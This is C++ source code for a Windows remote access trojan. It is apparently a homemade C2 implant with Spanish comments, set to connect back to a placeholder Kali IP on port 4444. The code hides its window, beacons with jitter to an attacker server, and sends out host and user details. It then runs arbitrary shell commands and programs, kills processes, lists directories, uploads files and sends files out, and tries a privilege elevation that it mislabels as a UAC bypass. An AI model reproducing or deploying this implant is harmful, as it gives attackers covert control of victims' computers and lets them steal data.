#define _WIN32_WINNT _WIN32_WINNT_WIN10
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <shellapi.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <vector>
#include <string>
#include <sstream>
#include <fstream>
#include <iostream>
#include <thread>
#include <chrono>
#include <random>
#include <psapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "psapi.lib")

// ============================================================================
// CONFIGURACIÓN - CAMBIA ESTA IP POR LA DE TU KALI
// ============================================================================
#define C2_SERVER "192.168.254.137"  // CAMBIA A TU IP
#define C2_PORT 4444
#define MUTEX_NAME "Global\\JDEXPLOIT_C2"
#define BUFFER_SIZE 8192

// ============================================================================
// PROCESAMIENTO DE COMANDOS
// ============================================================================
std::string ExecuteCommand(const char* cmd) {
    std::string result;
    char buffer[BUFFER_SIZE];
    FILE* pipe = _popen(cmd, "r");
    if (pipe) {
        while (fgets(buffer, sizeof(buffer), pipe)) {
            result += buffer;
        }
        _pclose(pipe);
    }
    return result.empty() ? "[+] Comando ejecutado\n" : result;
}

std::string ExecuteProgram(const char* program) {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    BOOL result = CreateProcessA(
        NULL, (LPSTR)program, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi
    );
    
    if (result) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return "[+] Programa ejecutado: " + std::string(program) + "\n";
    }
    return "[-] Error ejecutando: " + std::string(program) + "\n";
}

std::string GetProcessList() {
    std::stringstream ss;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {sizeof(pe)};
        if (Process32First(snap, &pe)) {
            ss << "PID\tNombre\n";
            do {
                ss << pe.th32ProcessID << "\t" << pe.szExeFile << "\n";
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    return ss.str();
}

std::string KillProcess(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (h) {
        TerminateProcess(h, 0);
        CloseHandle(h);
        return "[+] Proceso terminado: " + std::to_string(pid) + "\n";
    }
    return "[-] Error terminando proceso\n";
}

std::string ListDirectory(const char* path) {
    std::stringstream ss;
    std::string searchPath = std::string(path) + "\\*.*";
    
    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &ffd);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        ss << "Tipo\tTamaño\tNombre\n";
        do {
            if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                ss << "DIR\t-\t" << ffd.cFileName << "\n";
            } else {
                LARGE_INTEGER size;
                size.LowPart = ffd.nFileSizeLow;
                size.HighPart = ffd.nFileSizeHigh;
                ss << "FILE\t" << size.QuadPart << "\t" << ffd.cFileName << "\n";
            }
        } while (FindNextFileA(hFind, &ffd) != 0);
        FindClose(hFind);
    }
    return ss.str();
}

std::string GetSystemInfo() {
    std::stringstream ss;
    char buffer[256];
    DWORD size = sizeof(buffer);
    
    if (GetComputerNameA(buffer, &size)) 
        ss << "Hostname: " << buffer << "\n";
    
    size = sizeof(buffer);
    if (GetUserNameA(buffer, &size)) 
        ss << "Usuario: " << buffer << "\n";
    
    OSVERSIONINFOEXA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    GetVersionExA((LPOSVERSIONINFOA)&osvi);
    ss << "OS: Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
    ss << " (Build " << osvi.dwBuildNumber << ")\n";
    
    MEMORYSTATUSEX mem = {0};
    mem.dwLength = sizeof(mem);
    GlobalMemoryStatusEx(&mem);
    ss << "RAM: " << mem.ullTotalPhys / 1024 / 1024 / 1024 << " GB\n";
    
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    struct hostent* host = gethostbyname(hostname);
    if (host && host->h_addr_list[0]) {
        ss << "IP: " << inet_ntoa(*(struct in_addr*)host->h_addr_list[0]) << "\n";
    }
    
    return ss.str();
}

std::string UploadFile(const char* path, const char* data) {
    std::ofstream file(path, std::ios::binary);
    if (file.is_open()) {
        file.write(data, strlen(data));
        file.close();
        return "[+] Archivo subido: " + std::string(path) + "\n";
    }
    return "[-] Error subiendo archivo\n";
}

std::string DownloadFile(const char* path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) return "[-] Archivo no encontrado\n";
    
    file.seekg(0, std::ios::end);
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    
    std::vector<char> buffer(size);
    file.read(buffer.data(), size);
    file.close();
    
    // Convertir a string
    std::string result = "[+] Archivo: " + std::string(path) + "\n";
    result += std::string(buffer.data(), size);
    return result;
}

BOOL ElevateToSystem() {
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, cbSize, &cbSize)) {
            CloseHandle(hToken);
            if (elevation.TokenIsElevated) {
                return TRUE;
            }
        }
    }
    
    // Intentar bypass UAC
    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas";
    sei.lpFile = "cmd.exe";
    sei.lpParameters = "/c whoami > C:\\temp.txt";
    sei.nShow = SW_HIDE;
    
    return ShellExecuteExA(&sei);
}

// ============================================================================
// PROCESAR COMANDO
// ============================================================================
std::string ProcessCommand(const std::string& cmd) {
    std::string upper = cmd;
    
    if (cmd == "INFO") {
        char host[256], user[256];
        DWORD size = sizeof(host);
        GetComputerNameA(host, &size);
        size = sizeof(user);
        GetUserNameA(user, &size);
        
        char json[512];
        snprintf(json, sizeof(json), 
            "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"Windows 11\",\"av\":\"Defender\",\"priv\":\"USER\"}",
            host, user);
        return std::string(json);
    }
    else if (cmd == "INFO_FULL") {
        return GetSystemInfo();
    }
    else if (cmd == "PROCESSES") {
        return GetProcessList();
    }
    else if (cmd == "ELEVATE") {
        return ElevateToSystem() ? 
            "[+] Elevado a SYSTEM\n" : 
            "[-] Error elevando privilegios\n";
    }
    else if (cmd.substr(0, 5) == "SHELL") {
        if (cmd.length() > 6) {
            return ExecuteCommand(cmd.substr(6).c_str());
        }
        return "[-] Uso: SHELL <comando>\n";
    }
    else if (cmd.substr(0, 4) == "EXEC") {
        if (cmd.length() > 5) {
            return ExecuteProgram(cmd.substr(5).c_str());
        }
        return "[-] Uso: EXEC <programa>\n";
    }
    else if (cmd.substr(0, 4) == "KILL") {
        if (cmd.length() > 5) {
            DWORD pid = atoi(cmd.substr(5).c_str());
            return KillProcess(pid);
        }
        return "[-] Uso: KILL <PID>\n";
    }
    else if (cmd.substr(0, 3) == "DIR") {
        if (cmd.length() > 4) {
            return ListDirectory(cmd.substr(4).c_str());
        }
        return ListDirectory("C:\\");
    }
    else if (cmd.substr(0, 8) == "DOWNLOAD") {
        if (cmd.length() > 9) {
            return DownloadFile(cmd.substr(9).c_str());
        }
        return "[-] Uso: DOWNLOAD <archivo>\n";
    }
    else if (cmd.substr(0, 6) == "UPLOAD") {
        size_t sep = cmd.find('|');
        if (sep != std::string::npos) {
            std::string path = cmd.substr(7, sep - 7);
            std::string data = cmd.substr(sep + 1);
            return UploadFile(path.c_str(), data.c_str());
        }
        return "[-] Uso: UPLOAD <path>|<data>\n";
    }
    
    return "[!] Comando desconocido: " + cmd + "\n";
}

// ============================================================================
// CONEXIÓN C2
// ============================================================================
class C2Connection {
private:
    SOCKET sock;
    bool connected;
    
public:
    C2Connection() : sock(INVALID_SOCKET), connected(false) {
        WSADATA wsa;
        WSAStartup(MAKEWORD(2,2), &wsa);
    }
    
    ~C2Connection() {
        if (sock != INVALID_SOCKET) closesocket(sock);
        WSACleanup();
    }
    
    bool Connect(const char* host, int port) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) return false;
        
        sockaddr_in server = {0};
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        server.sin_addr.s_addr = inet_addr(host);
        
        if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            closesocket(sock);
            return false;
        }
        
        connected = true;
        return true;
    }
    
    bool Send(const std::string& data) {
        if (!connected) return false;
        int len = htonl(data.length());
        if (send(sock, (char*)&len, 4, 0) != 4) return false;
        if (send(sock, data.c_str(), data.length(), 0) != (int)data.length()) return false;
        return true;
    }
    
    std::string Receive() {
        if (!connected) return "";
        int len = 0;
        if (recv(sock, (char*)&len, 4, 0) != 4) {
            connected = false;
            return "";
        }
        len = ntohl(len);
        if (len <= 0 || len > 65535) {
            connected = false;
            return "";
        }
        
        std::vector<char> buffer(len + 1, 0);
        int total = 0;
        while (total < len) {
            int r = recv(sock, buffer.data() + total, len - total, 0);
            if (r <= 0) {
                connected = false;
                return "";
            }
            total += r;
        }
        return std::string(buffer.data(), len);
    }
    
    bool IsConnected() { return connected; }
};

// ============================================================================
// MAIN
// ============================================================================
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    
    // Ocultar ventana
    HWND hWnd = GetConsoleWindow();
    if (hWnd) ShowWindow(hWnd, SW_HIDE);
    
    // Mutex para una sola instancia
    HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
    
    // Loop principal
    C2Connection c2;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> jitter(1000, 5000);
    
    while (true) {
        if (!c2.IsConnected()) {
            if (c2.Connect(C2_SERVER, C2_PORT)) {
                std::string info = ProcessCommand("INFO");
                c2.Send(info);
            } else {
                Sleep(jitter(gen));
                continue;
            }
        }
        
        std::string cmd = c2.Receive();
        if (!cmd.empty()) {
            std::string response = ProcessCommand(cmd);
            c2.Send(response);
        }
        
        Sleep(1000);
    }
    
    CloseHandle(hMutex);
    return 0;
}
